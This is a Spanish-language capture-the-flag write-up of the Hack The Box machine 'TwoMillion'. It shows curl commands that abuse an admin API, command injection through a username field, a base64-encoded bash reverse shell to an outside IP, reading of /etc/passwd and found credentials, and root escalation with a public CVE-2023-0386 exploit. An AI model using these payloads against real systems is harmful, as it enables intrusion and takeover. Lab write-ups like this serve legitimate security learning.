---
title: "Twomillion - WriteUp"
date: Wed Apr 16 2025 17:30:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, reverse-shell, cve, exploit, nginx, php, linux, cve-2023-0386]
image: /assets/img/htb-writeups/Pasted image 20231129111144.png
---

{% include machine-info.html
  machine="Twomillion"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Twomillion](/assets/img/htb-writeups/Pasted image 20231129111144.png)

-----

Máquina Linux

Se trata de la antigua "prueba de acceso" que tenía Hack The Box en sus inicios para poder registrarte y darte de alta como usuario. Actualmente ya no existe.

NMAP

```bash
# Nmap 7.94SVN scan initiated Wed Nov 29 11:05:30 2023 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targeted.xml 10.129.229.66
Nmap scan report for 10.129.229.66
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos el NS _2million.htb_ al archivo _hosts_ ya que se acontece un virtual hosting.

HTTP

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129111144.png)

La web es un rompecabezas en el que tenemos que obtener un código de invitación para poder registrarte en la misma y obtener acceso.

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114449.png)

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114527.png)

Lo primero que vamos a averiguar es la función que genera el código de invitación.

Si nos vamos a la página http://2million.htb/invite y examinamos el código fuente con Ctrl+U veremos la función en JS que se ejecuta por detrás.

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129114808.png)

Si pinchamos sobre el enlace de la función veremos su código fuente, pero está ofuscado para que no lo podamos entender de primeras.

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129115021.png)

Copiamos el código y nos vamos a la página https://lelinhtinh.github.io/de4js/ que es un desofuscador de código online. 

Pegamos el código copia y pulsamos en la opción "Eval".

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129115322.png)

Encontramos una función llamada "makeInviteCode()" y una URL a la que poder enviar un POST para generar supuestamente el código que estamos buscando.

Vamos a probar de enviar un POST a esa API mediante _cURL_:

```bash
$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

Y recibimos la siguiente respuesta:

```http
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%  
```

Tenemos un mensaje encriptado con ROT13. Vamos a desencriptarlo.

```bash
$ echo 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Y nos devuelve el siguiente mensaje...

```
"In order to generate the invite code, make a POST request to /api/v1/invite/generate"
```

Le hacemos caso y hacemos la solicitud...

```bash
$ curl -X POST http://2million.htb/api/v1/invite/generate

{"0":200,"success":1,"data":{"code":"WVhVRjgtSlAySVMtQkNFU0QtT1ZQUkg=","format":"encoded"}}%     
```

El código que nos devuelve parece que está en _base64_, vamos a decodificarlo.

```bash
$ echo -n "WVhVRjgtSlAySVMtQkNFU0QtT1ZQUkg=" | base64 -d ;echo

YXUF8-JP2IS-BCESD-OVPRH
```

Y tenemos el código!

Vamos a probarlo...

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120548.png)

Rellenamos los campos...

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120721.png)

Y entramos con los datos proporcionados en el registro...

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120838.png)

Y estamos dentro...

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129120939.png)

Ahora vamos a hacer una petición GET normal a la API por si nos devolviera algo, el comando _jq_ es para que nos lo devuelva bonito:

```bash
$ curl -sv 2million.htb/api
```

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129123921.png)

Y nos devuelve nuestra cookie de inicio de sesión. Vamos a hacer la misma petición pero con la cookie y atacando a la API:

```bash
$ curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=7286h49ko0ktvsoe2qm05l33hk" | jq
```

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129124506.png)

Tenemos todas las rutas de la API. Pero las que nos llama la atención son las que hacen referencia a _admin_. 

Vamos a intentar solicitar a esta API de administrador nuevas cookies de inicio de sesión.

```bash
$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" | jq

{
  "status": "danger",
  "message": "Invalid content type."
}
```

Recibimos un "Invalid content type"

Vamos a probar con meterle una cabecera del tipo JSON a la petición:

```bash
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" | jq

{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Y nos dice que faltael parámetro "email", vamos a darle el nuestro:

```bash
$ url -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq

{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Parece que ahora nos falta otro parámetro, "is_admin", se lo pondremos a _true_.

```bash
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin":true}' | jq

{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Solo admite 0 o 1, se lo ponemos a 1.

```bash
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin":1}' | jq

{
  "id": 13,
  "username": "test",
  "is_admin": 1
}
```

Ahora si parece que le ha gustado. Nos vamos a la página en el navegador y refrescamos...

Vemos que no pasa nada.

Vamos a hacer uso de la API para que nos genere una conexión nueva

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"username":"test"}'
```

No hace nada. 

Buscando en internet formas de explotar la API probamos maneras hasta dar con la que funciona. Añadimos el comando ejecutar como segundo parámetro en el campo del nombre del usuario, quedando así:

```bash
$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"username":"test;id;"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"username":"test;cat /etc/passwd | grep -i bash;"}'

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

Ahora vamos a intentar conseguir una reverse shell. Para ello codificaremos el payload en _base64_ para no tener problemas con los caracteres especiales.

```bash
$ echo -n "bash -i >& /dev/tcp/10.10.16.25/4444 0>&1" | base64 ;echo

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS80NDQ0IDA+JjE=
```

Una vez tenemos el payload codificado nos ponemos a la escucha con _NetCat_ en el puerto indicado:

```bash
$ nc -nlvp 4444
```

Ejecutamos la solicitud POST a la API con el payload:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3avl7l5vlq8u0flt5ljtfqgd61" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS80NDQ0IDA+JjE= | base64 -d | bash;"}'
```

Y obtenemos acceso a la consola. Dentro!

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129132322.png)

Sanitizamos y empezamos la enumeración.

Nada más entrar descubrimos unas credenciales de acceso:

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129132628.png)

```http
admin:SuperDuperPass123
```

Cambiamos al usuario admin:

```bash
$ su admin
Password:
```

Registramos la primera bandera y seguimos.

Enumerando el contenido del host, encontramos en /var/mail un archivo de texto (admin) en formato correo electrónico con el siguiente contenido:

```txt
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Con las pistas que nos da el texto del email, encontramos el siguiente exploit:
https://github.com/sxlmnwb/CVE-2023-0386

Nos lo descargamos en formato .zip y lo compartimos en nuestra máquina.
Desde la máquina victima lo cogemos con _wget_ y lo movemos a /tmp.
Una vez ahí lo descomprimimos con _unzip_.
Entramos en la carpeta resultante y ejecutamos un _make all_ ignorando los warnings de compilación.

Creamos otra conexión hacia la máquina conectándonos por _ssh_ con las credenciales del usuario _admin_
 En una consola ejecutamos una parte del exploit y en la que ya teníamos abierta la otra parte como nos indican.

![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129142710.png)
 
![TWOMILLION](/assets/img/htb-writeups/Pasted image 20231129142138.png)

Perfecto! Somos root y podemos registrar la última bandera!
---

**Última actualización**: 2025-04-16<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
